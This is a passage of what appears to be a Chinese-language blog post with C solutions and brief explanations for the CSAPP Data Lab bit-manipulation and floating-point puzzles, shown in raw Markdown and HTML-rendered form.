Max ops: 5 * Rating: 2 */int negate(int x) &#123; return ~x+1;&#125; 思路 直接取反再加1 isPositive12345678910/* * isPositive - return 1 if x &gt; 0, return 0 otherwise * Example: isPositive(-1) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 8 * Rating: 3 */int isPositive(int x) &#123; return ~(x&gt;&gt;31)&amp;!!x;&#125; 思路 符号位判断，并且非0 isLessOrEqual1234567891011/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) &#123; return !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x+~y+1&gt;&gt;31) | !(x^y); //equal to !!(x&gt;&gt;31&amp;~(y&gt;&gt;31)) | !(~(x&gt;&gt;31)&amp;(y&gt;&gt;31))&amp;(x-y&gt;&gt;31) | !(x^y)&#125; 思路 x&lt;0&amp;&amp;y&gt;0 | !(x&gt;0&amp;&amp;y&lt;0)&amp;&amp;(x-y&gt;0) | x==y ilog21234567891011121314151617181920212223242526272829303132/* * ilog2 - return floor(log base 2 of x), where x &gt; 0 * Example: ilog2(16) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int ilog2(int x) &#123; int mark1 = 0x55; int mark2 = 0x33; int mark3 = 0x0F; mark1 |= mark1&lt;&lt;8; mark1 |= mark1&lt;&lt;16; mark2 |= mark2&lt;&lt;8; mark2 |= mark2&lt;&lt;16; mark3 |= mark3&lt;&lt;8; mark3 |= mark3&lt;&lt;16; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; x &gt;&gt;= 1; x = (x&gt;&gt;1&amp;mark1)+(x&amp;mark1); //every two bits; clear record; x = (x&gt;&gt;2&amp;mark2)+(x&amp;mark2); //every four bits; clear record; x = (x&gt;&gt;4&amp;mark3)+(x&amp;mark3); //every eight bits; clear record; x = (x&gt;&gt;8)+x; //every 16 bits; record in the low 8 bits; x = (x&gt;&gt;16)+x; //every 32 bits; record in the low 8 bits; return x&amp;0xFF;&#125; 思路 先构造从最高的1到最低位均为1的二进制，然后类似bitCount float_neg123456789101112131415161718/* * float_neg - Return bit-level equivalent of expression -f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representations of * single-precision floating point values. * When argument is NaN, return argument. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 10 * Rating: 2 */unsigned float_neg(unsigned uf) &#123; unsigned t = uf&amp;0x7FFFFFFF; if(t^0x7F800000 &amp;&amp; (t&gt;&gt;23)+1&gt;&gt;8) return uf; else return uf^0x80000000;&#125; 思路 判别是否是NaN。先判断尾数是否全0，然后用(t&gt;&gt;23)+1&gt;&gt;8判断exp是否全1 float_i2f1234567891011121314151617181920212223242526272829303132333435363738394041/* * float_i2f - Return bit-level equivalent of expression (float) x * Result is returned as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point values. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned float_i2f(int x) &#123; unsigned shiftLeft=0; unsigned afterShift, tmp, flag; unsigned absX=x; unsigned sign=0; //special case if (x==0) return 0; //if x &lt; 0, sign = 1000...,abs_x = -x if (x&lt;0) &#123; sign=0x80000000; absX=-x; &#125; afterShift=absX; //count shift_left and after_shift while (1) &#123; tmp=afterShift; afterShift&lt;&lt;=1; shiftLeft++; if (tmp &amp; 0x80000000) break; &#125; if ((afterShift &amp; 0x01ff)&gt;0x0100) flag=1; else if ((afterShift &amp; 0x03ff)==0x0300) flag=1; else flag=0; return sign + (afterShift&gt;&gt;9) + ((159-shiftLeft)&lt;&lt;23) + flag;&#125;//from http://www.cnblogs.com/tenlee/p/4951639.html 思路 分情况处理0、负数、正数 要处理舍人 向接近的舍入 如果处于中间，向偶数舍入 舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的 float_twict123456789101112131415161718192021222324252627/* * float_twice - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned float_twice(unsigned uf) &#123; unsigned t = uf&amp;0x7FFFFFFF; unsigned temp = t&amp;0x7F800000; unsigned temp2 = uf&amp;0xFF800000; int expFull = !(temp^0x7F800000); if(t^0x7F800000 &amp;&amp; expFull) return uf; if(expFull)&#123; return temp2; &#125; if(!(t&amp;0x7F800000))&#123; unsigned k = (uf&amp;0x7FFFFF); return temp2+(k&lt;&lt;1); &#125; return (temp&gt;&gt;23)+1&lt;&lt;23 | uf&amp;0x807FFFFF;&#125; 思路 分情况处理三种IEEE754的情况 需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了","raw":"---\ntitle: CSAPP Data Lab\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-09-13 13:39:11\ntags:\n- CSAPP Lab\ndescription: CSAPP 数据实验的解答\ncategories:\n- CSAPP\n---\n\n# CSAPP data Lab\n\n> 注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1>>n+1 等价于 1>>(n+1)，所以代码里写了1>>n+1。\n\n### bitAnd\n\n```c\n/* \n * bitAnd - x&y using only ~ and | \n *   Example: bitAnd(6, 5) = 4\n *   Legal ops: ~ |\n *   Max ops: 8\n *   Rating: 1\n */\nint bitAnd(int x, int y) {\n\treturn ~(~x|~y);\n}\n```\n\n#### 思路\n\n- 德摩根定律\n\n### getByte\n\n```c\n/* \n * getByte - Extract byte n from word x\n *   Bytes numbered from 0 (LSB) to 3 (MSB)\n *   Examples: getByte(0x12345678,1) = 0x56\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 6\n *   Rating: 2\n */\nint getByte(int x, int n) {\n\tint bias = n<<3;\n\treturn (x>>bias)&0xFF;\n}\n```\n\n#### 思路\n\n- 移位到最低的1byte然后用0xFF提取\n\n### logicalShift\n\n```c\n/* \n * logicalShift - shift x to the right by n, using a logical shift\n\ti\n *   Can assume that 0 <= n <= 31\n *   Examples: logicalShift(0x87654321,4) = 0x08765432\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 20\n *   Rating: 3 \n */\nint logicalShift(int x, int n) {\n\treturn (1<<32+~n<<1)+~0 & (x>>n);\n  //equal to ((1<<31-n<<1)-1)&(x>>n);\n  //负号优先级高于移位\n}\n```\n\n#### 思路\n\n- 因为不能用`-`，所以用取反加一代替取负\n\n- 构造低`32-n`bit的1来提取移位后的数值\n\n- 因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位\n\n  > 小技巧，如果n移位k，k$\\in$[0, 32]，则可以`n>>(k-!!k)>>!!k`\n\n### bitCount\n\n```c\n/*\n * bitCount - returns count of number of 1's in word\n *   Examples: bitCount(5) = 2, bitCount(7) = 3\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 40\n *   Rating: 4\n */\nint bitCount(int x) {\n\tint mark1 = 0x55;\n\tint mark2 = 0x33;\n\tint mark3 = 0x0F;\n\tmark1 |= mark1<<8;\n\tmark1 |= mark1<<16;\n\tmark2 |= mark2<<8;\n\tmark2 |= mark2<<16;\n\tmark3 |= mark3<<8;\n\tmark3 |= mark3<<16;\n\n\tx = (x>>1&mark1)+(x&mark1);\t//every two bits; clear record;\n\tx = (x>>2&mark2)+(x&mark2);\t//every four bits; clear record;\n\tx = (x>>4&mark3)+(x&mark3);\t//every eight bits; clear record;\n\tx = (x>>8)+x;\t//every 16 bits; record in the low 8 bits;\n\tx = (x>>16)+x;\t//every 32 bits; record in the low 8 bits;\n\treturn x&0xFF;\n}\n```\n\n#### 思路\n\n- 构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目\n- 同样的思路，提取每四位的low bit、high bit，然后相加\n- 因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果\n\n### bang\n\n```c\n/*\n * bang - Compute !x without using !\n *   Examples: bang(3) = 0, bang(0) = 1\n *   Legal ops: ~ & ^ | + << >>\n *   Max ops: 12\n *   Rating: 4 \n */\nint bang(int x) {\n\tx |= x>>1;\n\tx |= x>>2;\n\tx |= x>>4;\n\tx |= x>>8;\n\tx |= x>>16;\n\treturn ~x&0x1;\n}\n```\n\n#### 思路\n\n- 如果非0，位模式从最高位的1到最低位都填充为1，\n- 如果为0，则位模式还是保持全0\n\n### tmin\n\n```c\n/* \n * tmin - return minimum two's complement integer \n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 4\n *   Rating: 1\n */\nint tmin(void) {\n\treturn 1<<31;\n}\n```\n\n### fitBits\n\n```c\n/* \n * fitsBits - return 1 if x can be represented as an \n *  n-bit, two's complement integer.\n *   1 <= n <= 32\n *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 15\n *   Rating: 2\n */\nint fitsBits(int x, int n) {\n\treturn !(x>>n+~0)|!((x>>n+~0)+1);\n  //equal to !(x>>n-1) | !((x>>n-1)+1)\n}\n```\n\n#### 思路\n\n- 算术移n-1位，如果是负数，且可以用n bits的补码表示，则得到-1。如果是正数，则得到0。\n\n### divpwr2\n\n```c\n/* \n * divpwr2 - Compute x/(2^n), for 0 <= n <= 30\n *  Round toward zero\n *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 15\n *   Rating: 2\n */\nint divpwr2(int x, int n) {\n\tint t = x>>31;\n\treturn (x+(t&1<<n)+(~(t&1)+1))>>n;\n  //equal to (x+(t&1<<n)-(t&1))>>n;\n  //note that & 的优先级低于<<\n}\n```\n\n#### 思路\n\n- 直接移位是round down，无论是负数还是正数\n- 所以要实现round to zero , C表达式为`x<0 ? x+(pow(2,n)-1)>>n : x>>n `\n\n### negate\n\n```c\n/* \n * negate - return -x \n *   Example: negate(1) = -1.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 5\n *   Rating: 2\n */\nint negate(int x) {\n\treturn ~x+1;\n}\n```\n\n#### 思路\n\n- 直接取反再加1\n\n### isPositive\n\n```c\n/* \n * isPositive - return 1 if x > 0, return 0 otherwise \n *   Example: isPositive(-1) = 0.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 8\n *   Rating: 3\n */\nint isPositive(int x) {\n\treturn ~(x>>31)&!!x;\n}\n```\n\n#### 思路\n\n- 符号位判断，并且非0\n\n### isLessOrEqual\n\n```c\n/* \n * isLessOrEqual - if x <= y  then return 1, else return 0 \n *   Example: isLessOrEqual(4,5) = 1.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 24\n *   Rating: 3\n */\nint isLessOrEqual(int x, int y) {\n\treturn !!(x>>31&~(y>>31)) | !(~(x>>31)&(y>>31))&(x+~y+1>>31) | !(x^y);\n\t//equal to  !!(x>>31&~(y>>31)) | !(~(x>>31)&(y>>31))&(x-y>>31) | !(x^y)\n}\n```\n\n#### 思路\n\n- `x<0&&y>0 | !(x>0&&y<0)&&(x-y>0) | x==y`\n\n### ilog2\n\n```c\n/*\n * ilog2 - return floor(log base 2 of x), where x > 0\n *   Example: ilog2(16) = 4\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 90\n *   Rating: 4\n */\nint ilog2(int x) {\n\tint mark1 = 0x55;\n\tint mark2 = 0x33;\n\tint mark3 = 0x0F;\n\tmark1 |= mark1<<8;\n\tmark1 |= mark1<<16;\n\tmark2 |= mark2<<8;\n\tmark2 |= mark2<<16;\n\tmark3 |= mark3<<8;\n\tmark3 |= mark3<<16;\n\n\tx |= x>>1;\n\tx |= x>>2;\n\tx |= x>>4;\n\tx |= x>>8;\n\tx |= x>>16;\n\tx >>= 1;\n\n\tx = (x>>1&mark1)+(x&mark1);\t//every two bits; clear record;\n\tx = (x>>2&mark2)+(x&mark2);\t//every four bits; clear record;\n\tx = (x>>4&mark3)+(x&mark3);\t//every eight bits; clear record;\n\tx = (x>>8)+x;\t//every 16 bits; record in the low 8 bits;\n\tx = (x>>16)+x;\t//every 32 bits; record in the low 8 bits;\n\treturn x&0xFF;\n}\n```\n\n#### 思路\n\n- 先构造从最高的1到最低位均为1的二进制，然后类似bitCount\n\n### float_neg\n\n```c\n/* \n * float_neg - Return bit-level equivalent of expression -f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int's, but\n *   they are to be interpreted as the bit-level representations of\n *   single-precision floating point values.\n *   When argument is NaN, return argument.\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 10\n *   Rating: 2\n */\nunsigned float_neg(unsigned uf) {\n\tunsigned t = uf&0x7FFFFFFF;\n\tif(t^0x7F800000 && (t>>23)+1>>8)\n\t\treturn uf;\n\telse \n\t\treturn uf^0x80000000;\n}\n```\n\n#### 思路\n\n- 判别是否是NaN。先判断尾数是否全0，然后用`(t>>23)+1>>8`判断exp是否全1\n\n### float_i2f\n\n```c\n/* \n * float_i2f - Return bit-level equivalent of expression (float) x\n *   Result is returned as unsigned int, but\n *   it is to be interpreted as the bit-level representation of a\n *   single-precision floating point values.\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned float_i2f(int x) {\n    unsigned shiftLeft=0;\n    unsigned afterShift, tmp, flag;\n    unsigned absX=x;\n    unsigned sign=0;\n    //special case\n    if (x==0) return 0;\n    //if x < 0, sign = 1000...,abs_x = -x\n    if (x<0)\n    {\n        sign=0x80000000;\n        absX=-x;\n    }\n    afterShift=absX;\n    //count shift_left and after_shift\n    while (1)\n    {\n        tmp=afterShift;\n        afterShift<<=1;\n        shiftLeft++;\n        if (tmp & 0x80000000) break;\n    }\n    if ((afterShift & 0x01ff)>0x0100)\n        flag=1;\n    else if ((afterShift & 0x03ff)==0x0300)\n        flag=1;\n    else\n        flag=0;\n \n    return sign + (afterShift>>9) + ((159-shiftLeft)<<23) + flag;\n}\n//from http://www.cnblogs.com/tenlee/p/4951639.html\n```\n\n#### 思路\n\n- 分情况处理0、负数、正数\n\n- 要处理舍人\n\n  > - 向接近的舍入\n  > - 如果处于中间，向偶数舍入\n\n- 舍入时，如果尾数加一，exp有可能需要进位，这时候直接加一效果一样，可以导致exp进位，不需要特殊处理。如果exp等于0xFE，那么进位就变成了inf，也是合法的\n\n### float_twict\n\n```c\n/* \n * float_twice - Return bit-level equivalent of expression 2*f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int's, but\n *   they are to be interpreted as the bit-level representation of\n *   single-precision floating point values.\n *   When argument is NaN, return argument\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned float_twice(unsigned uf) {\n\tunsigned t = uf&0x7FFFFFFF;\n\tunsigned temp = t&0x7F800000;\n\tunsigned temp2 = uf&0xFF800000;\n\tint expFull = !(temp^0x7F800000);\n\tif(t^0x7F800000 && expFull)\n\t\treturn uf;\n\tif(expFull){\n\t\treturn temp2;\n\t}\n\tif(!(t&0x7F800000)){\n\t\tunsigned k = (uf&0x7FFFFF);\n\t\treturn temp2+(k<<1);\n\t}\n\treturn (temp>>23)+1<<23 | uf&0x807FFFFF;\n}\n```\n\n#### 思路\n\n- 分情况处理三种IEEE754的情况\n- 需要注意exp全0时，乘以二就是尾数乘以二，如果发生进位需要exp进位，不需要特殊处理（第三个if），因为进位直接导致exp加一，这就足够了\n\n","content":"<h1 id=\"CSAPP-data-Lab\"><a href=\"#CSAPP-data-Lab\" class=\"headerlink\" title=\"CSAPP data Lab\"></a>CSAPP data Lab</h1><blockquote>\n<p>注意，本文代码出于节省括号避免繁杂的考虑，对运算符优先级利用得比较充分，比如 1&gt;&gt;n+1 等价于 1&gt;&gt;(n+1)，所以代码里写了1&gt;&gt;n+1。</p>\n</blockquote>\n<h3 id=\"bitAnd\"><a href=\"#bitAnd\" class=\"headerlink\" title=\"bitAnd\"></a>bitAnd</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * bitAnd - x&amp;y using only ~ and | </span></span><br><span class=\"line\"><span class=\"comment\"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ~ |</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 8</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 1</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bitAnd</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~(~x|~y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>德摩根定律</li>\n</ul>\n<h3 id=\"getByte\"><a href=\"#getByte\" class=\"headerlink\" title=\"getByte\"></a>getByte</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * getByte - Extract byte n from word x</span></span><br><span class=\"line\"><span class=\"comment\"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: getByte(0x12345678,1) = 0x56</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 6</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 2</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getByte</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> bias = n&lt;&lt;<span class=\"number\">3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (x&gt;&gt;bias)&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>移位到最低的1byte然后用0xFF提取</li>\n</ul>\n<h3 id=\"logicalShift\"><a href=\"#logicalShift\" class=\"headerlink\" title=\"logicalShift\"></a>logicalShift</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * logicalShift - shift x to the right by n, using a logical shift</span></span><br><span class=\"line\"><span class=\"comment\">\ti</span></span><br><span class=\"line\"><span class=\"comment\"> *   Can assume that 0 &lt;= n &lt;= 31</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 20</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 3 </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">logicalShift</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">32</span>+~n&lt;&lt;<span class=\"number\">1</span>)+~<span class=\"number\">0</span> &amp; (x&gt;&gt;n);</span><br><span class=\"line\">  <span class=\"comment\">//equal to ((1&lt;&lt;31-n&lt;&lt;1)-1)&amp;(x&gt;&gt;n);</span></span><br><span class=\"line\">  <span class=\"comment\">//负号优先级高于移位</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><p>因为不能用<code>-</code>，所以用取反加一代替取负</p>\n</li>\n<li><p>构造低<code>32-n</code>bit的1来提取移位后的数值</p>\n</li>\n<li><p>因为移位量不能小于0或大于等于32，所以对于n可能是0而导致移位量是32的情况，先移位31位，再移位1位</p>\n<blockquote>\n<p>小技巧，如果n移位k，k$\\in$[0, 32]，则可以<code>n&gt;&gt;(k-!!k)&gt;&gt;!!k</code></p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"bitCount\"><a href=\"#bitCount\" class=\"headerlink\" title=\"bitCount\"></a>bitCount</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * bitCount - returns count of number of 1's in word</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 40</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bitCount</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark1 = <span class=\"number\">0x55</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark2 = <span class=\"number\">0x33</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> mark3 = <span class=\"number\">0x0F</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark1 |= mark1&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark2 |= mark2&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tmark3 |= mark3&lt;&lt;<span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">1</span>&amp;mark1)+(x&amp;mark1);\t<span class=\"comment\">//every two bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">2</span>&amp;mark2)+(x&amp;mark2);\t<span class=\"comment\">//every four bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">4</span>&amp;mark3)+(x&amp;mark3);\t<span class=\"comment\">//every eight bits; clear record;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">8</span>)+x;\t<span class=\"comment\">//every 16 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\tx = (x&gt;&gt;<span class=\"number\">16</span>)+x;\t<span class=\"comment\">//every 32 bits; record in the low 8 bits;</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-3\"><a href=\"#思路-3\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>构造0x55555555，提取每两位中的low bit。通过移位及0x55555555，提取每两位中的高位。然后相加，使得结果中，每两位的二进制值就是该两位的bit数目</li>\n<li>同样的思路，提取每四位的low bit、high bit，然后相加</li>\n<li>因为32==100000(二级制)，也就是只需要5位就可以记录有多少bit数，所以不需要每次都构造常数屏蔽高位的值，直接移位相加然后取低8bit就可以得到最终结果</li>\n</ul>\n<h3 id=\"bang\"><a href=\"#bang\" class=\"headerlink\" title=\"bang\"></a>bang</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * bang - Compute !x without using !</span></span><br><span class=\"line\"><span class=\"comment\"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 12</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 4 </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bang</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">2</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">4</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">8</span>;</span><br><span class=\"line\">\tx |= x&gt;&gt;<span class=\"number\">16</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ~x&amp;<span class=\"number\">0x1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-4\"><a href=\"#思路-4\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>如果非0，位模式从最高位的1到最低位都填充为1，</li>\n<li>如果为0，则位模式还是保持全0</li>\n</ul>\n<h3 id=\"tmin\"><a href=\"#tmin\" class=\"headerlink\" title=\"tmin\"></a>tmin</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\"> * tmin - return minimum two's complement integer </span></span><br><span class=\"line\"><span class=\"comment\"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> *   Max ops: 4</span></span><br><span class=\"line\"><span class=\"comment\"> *   Rating: 1</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span 